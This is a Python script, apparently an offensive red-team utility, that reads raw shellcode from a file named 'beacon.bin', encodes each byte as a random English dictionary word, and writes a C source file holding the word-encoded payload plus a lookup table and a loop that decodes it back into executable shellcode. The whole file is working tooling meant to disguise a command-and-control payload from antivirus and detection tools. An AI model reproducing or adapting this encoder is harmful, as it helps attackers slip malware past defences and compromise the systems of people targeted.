import random

def gen_word_combinations():
    # read in words dictionary
    with open('dictionary.txt') as dictionary:
        words = dictionary.readlines()

    # Select random words from dictionary
    # why is this 257?  It fails at 256
    random_words = random.sample(words, 257)
    return random_words

def get_shellcode(input_file):
    file_shellcode = b''
    try:
        with open(input_file, 'rb') as shellcode_file:
            file_shellcode = shellcode_file.read()
            file_shellcode = file_shellcode.strip()
            binary_code = ''

            for byte in file_shellcode:
                binary_code += "\\x" + hex(byte)[2:].zfill(2)

            cs_shellcode = "0" + ",0".join(binary_code.split("\\")[1:])

        return(cs_shellcode)
    
    except FileNotFoundError:
        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")

    

if __name__ == '__main__':
    '''
        Build translation table
    '''
    words = gen_word_combinations()
    english_array = []
    for i in range(0, 256):
        english_array.append(words.pop(1).strip())

    tt_index = 0
    translation_table = 'unsigned char* translation_table[XXX] = { '
    for word in english_array:
        translation_table = translation_table + '"' + word + '",'
        tt_index = tt_index + 1

    translation_table = translation_table.rstrip(', ') + ' };\n'
    translation_table = translation_table.replace('XXX', str(tt_index))
    
    '''
        Read and format shellcode
    '''
    shellcode = get_shellcode('beacon.bin')
    sc_len = len(shellcode.split(','))
    print('Shellcode length: ', sc_len)
    sc_index = 0


    '''
        Translate shellcode
    '''
    translated_shellcode = 'const char* translated_shellcode[XXX] = { '
    for byte in shellcode.split(','):
        #print(int(byte, 16))
       translated_shellcode = translated_shellcode + '"' + english_array[int(byte, 16)] + '",'
       sc_index = sc_index + 1  

    translated_shellcode = translated_shellcode.strip(',\'') + ' };\n'
    translated_shellcode = translated_shellcode.replace('XXX', str(sc_index))
    shellcode_var = "unsigned char shellcode[XXX];";
    shellcode_var = shellcode_var.replace('XXX', str(sc_index))

    generated_forloop = '''
        printf("Translating shellcode!\n");
        /*
         for loop is defined as such:
          for (int sc_index = 0; sc_index <= # of shelcode bytes; sc_index++)
        */
        for (int sc_index = 0; sc_index <= XXX; sc_index++) {
                for (int tt_index = 0; tt_index <= 255; tt_index++) {
                        if (translation_table[tt_index] == translated_shellcode[sc_index]) {
                                shellcode[sc_index] = tt_index;
                                break;
                        }
                }
        }
'''
    generated_forloop = generated_forloop.replace('XXX', str(sc_len))
    
    '''
        Save the results
    '''
    with open("generated.c", "w") as outfile:
        outfile.write(translation_table + '\n')
        outfile.write(translated_shellcode + '\n')
        outfile.write(shellcode_var + '\n')
        outfile.write('int sc_len = sizeof(shellcode);\n')
        outfile.write(generated_forloop + '\n')
